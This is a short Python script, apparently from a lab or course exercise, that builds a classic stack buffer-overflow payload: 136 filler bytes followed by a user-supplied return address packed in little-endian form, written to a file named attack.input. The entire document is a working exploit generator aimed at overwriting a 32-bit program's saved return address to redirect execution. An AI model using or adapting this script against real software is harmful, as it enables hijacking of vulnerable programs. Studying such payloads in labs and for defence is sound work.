import sys

def generate_attack_string(targetAddress):
    bufferSize = 136  # Adjusted buffer size to accommodate the little-endian address
    ebp_size = 4  # For a 32-bit system, EBP size is 4 bytes

    # Convert the target address to little-endian format
    targetAddress = int(targetAddress, 16)
    targetAddress_le = targetAddress.to_bytes(4, byteorder='little')

    # Craft the attack string
    attack_string = b'A' * bufferSize
    attack_string += targetAddress_le

    return attack_string

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 gen_input.py <targetAddress>")
        sys.exit(1)

    targetAddress = sys.argv[1]

    # Generate the attack string
    attack_string = generate_attack_string(targetAddress)

    # Write the attack string to a file
    with open("attack.input", "wb") as f:
        f.write(attack_string)

    print(f"Attack string written to attack.input")